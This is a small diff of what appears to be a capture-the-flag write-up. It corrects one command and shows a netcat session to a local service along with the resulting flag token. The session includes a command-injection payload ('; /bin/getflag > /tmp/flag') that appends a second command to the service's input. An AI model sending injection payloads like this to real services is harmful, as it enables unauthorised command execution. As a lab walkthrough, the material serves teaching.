@@ -83,6 +83,6 @@ nc localhost 5151
 ; /bin/getflag > /tmp/flag
 ```
 ```
-cat /tmp/easy
+cat /tmp/flag
 ```
 > Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
